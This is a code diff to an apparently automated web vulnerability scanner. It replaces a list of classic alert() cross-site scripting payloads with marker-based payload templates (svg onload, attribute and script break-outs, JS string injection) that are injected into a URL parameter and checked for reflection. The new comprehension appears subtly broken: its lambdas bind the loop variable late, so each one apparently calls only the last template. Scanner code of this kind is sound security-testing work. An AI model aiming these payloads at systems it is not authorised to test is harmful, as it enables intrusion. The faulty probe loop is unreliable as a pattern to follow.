@@ -1,20 +1,9 @@
 """Cross-Site Scripting (XSS) actions."""
 
 from actions.registry import action, ActionContext, ActionResult
-from core.validators import inject_param
-from core.verification_oracle import VerificationOracle
+from core.verification_oracle import probe_reflected_xss
 from tools.external import tool_available
 from tools.wrappers import curl
-
-
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "\"><script>alert(1)</script>",
-    "'><script>alert(1)</script>",
-    "<svg onload=alert(1)>",
-    "<body onload=alert(1)>",
-]
 
 
 @action(
@@ -25,33 +14,56 @@ XSS_PAYLOADS = [
     produces="VulnCandidate",
     idempotent=True,
     timeout=120,
-    description="Test a parameter for reflected XSS",
+    description="Test a parameter for reflected XSS (marker gate + verbatim oracle)",
     category="web",
 )
 async def reflected_xss(ctx: ActionContext) -> ActionResult:
     url = ctx.params["url"]
     param = ctx.params["param"]
-    oracle = VerificationOracle()
 
-    for payload in XSS_PAYLOADS:
-        test_url = inject_param(url, param, payload)  # noqa: F841 — kept for evidence
-        verdict = await oracle.verify_xss(url, param, payload)
+    async def fetch(target: str) -> str:
+        result = await curl(target, output="full")
+        return result.get("body", "") or ""
 
-        if verdict.confidence.value in ("FIRM", "CONFIRMED"):
-            return ActionResult(
-                success=True,
-                confidence=verdict.confidence.value,
-                data={
-                    "url": url,
-                    "param": param,
-                    "payload": payload,
-                    "type": "reflected",
-                },
-                evidence=verdict.evidence,
-            )
+    payload, test_url, verdict = await probe_reflected_xss(
+        url, param,
+        [lambda marker: payload_template(marker)
+         for payload_template in _payload_templates()],
+        fetch,
+    )
+
+    if verdict.confidence.value == "FIRM":
+        return ActionResult(
+            success=True,
+            confidence="FIRM",
+            data={
+                "url": url,
+                "param": param,
+                "payload": payload,
+                "test_url": test_url,
+                "type": "reflected",
+            },
+            evidence=verdict.evidence,
+        )
 
     return ActionResult(False, error="no reflected XSS detected",
                         confidence="TENTATIVE")
+
+
+def _payload_templates() -> list:
+    def element(marker: str) -> str:
+        return (f"<sVg/onLOad=document.body.append(`{marker}`.repeat(2))>")
+
+    def attribute(marker: str) -> str:
+        return (f"\"><sVg/onLOad=document.body.append(`{marker}`.repeat(2))>")
+
+    def js_string(marker: str) -> str:
+        return f"'-document.body.append(`{marker}`.repeat(2))-'"
+
+    def script_break(marker: str) -> str:
+        return (f"</script><sVg/onLOad=document.body.append(`{marker}`.repeat(2))>")
+
+    return [element, attribute, js_string, script_break]
 
 
 @action(
